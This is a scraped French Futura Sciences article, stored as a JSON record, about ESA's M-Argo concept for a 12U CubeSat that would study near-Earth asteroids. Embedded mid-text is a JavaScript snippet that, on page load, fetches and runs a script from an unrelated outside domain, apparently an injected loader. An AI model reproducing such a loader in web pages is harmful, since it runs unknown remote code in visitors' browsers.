{"title": "Un CubeSat va partir à l'assaut d'un astéroïde : une première", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "20/11/2017", "content": "Aujourd'hui, les minuscules CubeSat sont surtout cantonnés à des missions d'observation de la Terre et à la démonstration de nouvelles technologies. La maturité de cette technologie permet désormais d'envisager d'ici quelques années des missions au-delà de l'orbite basse. L'Agence spatiale européenne étudie même un CubeSat qui rejoindrait un astéroïde pour l'étudier de près.  Ce qu'il faut retenir La miniaturisation des composants spatiaux rend possible l'utilisation de CubeSat pour des missions d'exploration. M-Argo pourrait préfigurer une flotte de CubeSat envoyée pour réaliser un sondage inédit des astéroïdes proches de la Terre, y compris des plus petits d'entre eux. La maturité des CubeSat et la miniaturisation des composants spatiaux représentent une opportunité technologique pour les sociétés du «  New Space  ». Les scientifiques et les agences spatiales s'y intéressent également, notamment en raison de leurs faibles coûts et parce qu'ils peuvent réaliser des missions complémentaires à celles de gros satellites. Ainsi, l'Agence spatiale européenne étudie plusieurs concepts de missions s'appuyant sur l'utilisation de CubeSat pour fonctionner au-delà de l' orbite  basse. Très petits, ils ne peuvent pas tout faire comme les grands. Sur certains points, ils font aussi bien ou différemment mais sur d'autres, des solutions alternatives sont à trouver. Compte tenu de cette petite taille, la puissance comme l' énergie  disponible pour faire fonctionner les servitudes (communication,  propulsion électrique , survie dans l'espace lointain) et les instruments sont forcément limitées. Pour atténuer ces contraintes techniques, voire s'en affranchir, l'idée de l' ESA  est d'utiliser des satellites  hôtes  qui mettraient en commun leur servitudes et amèneraient des CubeSat aussi près que possible de leur destination cible. Le saviez-vous ? CubeSat est un standard de nanosatellites, créé en 1999 par les universités CalPoly et Stanford en Californie, constitués d'une ou plusieurs unités d’une taille et d’une masse fixées : respectivement 10 x 10 x 10 centimètres et 1,33 kilogramme. Le format le plus couramment utilisé est le CubeSat de 3 unités (CubeSat 3U). M-Argo en aura 12. Parmi les projets à l'étude, l'ESA a récemment communiqué sur la mission M-Argo ( Miniaturized Asteroid Remote Geophysical Observer ). Poussé par le  Concurrent Design Facility , un bureau d'études du Centre européen de recherche et des techniques spatiales de l'ESA ( ESTEC ), M-Argo a pour objectif d'étudier un  astéroïde  à l'aide d'une caméra multispectrale et un altimètre  laser . Pour rejoindre sa cible, M-Argo ne fera pas le voyage depuis la  Terre . Il sera amené, à bord d'un satellite hôte, au-delà de l'orbite lunaire ou à un des  points de Lagrange  terrestres et terminera son voyage en utilisant ses propres servitudes et système de propulsion électrique. L'exploration et la surveillance futures des astéroïdes proches de la Terre pourraient être réalisées par une flottille de CubeSats. © ESA, ScienceOffice.org Pour concevoir un CubeSat, il faut penser autrement « Pour l'instant, M-Argo n'est qu'un concept, mais qui nous fournit des informations précieuses sur les développements technologiques à mettre en place pour une démonstration en vol dans un avenir proche » , commente Roger Walker, responsable des Technology CubeSats de l'ESA. Et d'ajouter que  « cela coûterait environ un dixième de la plus petite mission dans l'espace lointain, démocratisant l'exploration spatiale au-delà de la Terre, la mettant à la portée de nouveaux acteurs, de la même manière que les CubeSat ont déjà ouvert l'orbite terrestre basse »  à de nouveaux acteurs offrant de nouveaux services et l' émergence  d'un nouvel «  écosystème  », notamment dans le  secteur commercial de l'observation de la Terre .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Avec une réduction des coûts aussi significatives, il est possible d'envoyer de  « 10 à 20 CubeSat pour explorer différents astéroïdes et réaliser une vaste étude quantitative sur la population des objets proches de la Terre, afin de mieux les connaître (science) et identifier des  ressources naturelles  susceptibles d'êtres exploitées à l'avenir » . Pour devenir réalité, M-Argo a besoin d'une propulsion électrique solaire miniaturisée, d'une antenne plate pour augmenter le gain du signal  radio  et d'un transpondeur en bande X pour soutenir la communication vers les stations au sol terrestres et comme moyen de navigation spatiale. Il reste aussi à identifier une opportunité de lancement appropriée à l'horizon 2021, date à laquelle le satellite pourrait être prêt. Les scientifiques s'y préparent et une liste de 83 astéroïdes cibles suffisamment proches de la Terre et accessibles à un CubeSat est déjà à l'étude. Certains de ces astéroïdes mesurent 300 mètres ou plus, mais la plupart sont petits, environ 50 mètres, et ceux-là n'ont jamais été approchés. ", "theme": "sciences"}